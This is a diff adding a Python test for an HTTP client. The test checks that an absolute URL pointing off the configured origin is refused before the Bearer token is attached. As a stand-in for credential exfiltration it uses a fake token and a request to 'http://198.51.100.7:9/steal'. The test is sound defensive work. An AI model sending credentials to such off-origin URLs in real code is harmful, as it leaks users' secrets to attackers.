@@ -548,3 +548,39 @@ def test_a_credential_store_failure_becomes_a_client_error() -> None:
         raise AssertionError("expected a ClientError")
 
     assert asyncio.run(scenario()).code == errors.ERROR_UNAUTHORIZED
+
+
+def test_an_absolute_url_is_refused_before_the_token_is_attached() -> None:
+    """A per-request absolute URL cannot override the configured origin and
+    carry the Bearer credential off to another host.
+
+    httpx resolves the request url against base_url, and an absolute url wins
+    origin and all. The client attaches the device token unconditionally, so
+    without the origin guard an absolute (or plain-http, off-host) url would put
+    the credential on the wire to somewhere the confidential-endpoint policy
+    never approved. The request must be refused before it leaves the client.
+    """
+    seen = {"called": False, "authorization": None}
+
+    async def handler(request: httpx.Request) -> httpx.Response:
+        seen["called"] = True
+        seen["authorization"] = request.headers.get("authorization")
+        return httpx.Response(200, json=_translation_payload())
+
+    client = _client(handler, token_provider=lambda: "wtd1.abc123.supersecret")
+
+    async def scenario() -> ClientError:
+        try:
+            await client._request("GET", "http://198.51.100.7:9/steal")
+        except ClientError as exc:
+            return exc
+        finally:
+            await client.aclose()
+        raise AssertionError("expected a ClientError")
+
+    error = asyncio.run(scenario())
+
+    assert error.code == errors.ERROR_INSECURE_ENDPOINT
+    # The request never left the client, so the token went nowhere.
+    assert seen["called"] is False
+    assert seen["authorization"] is None
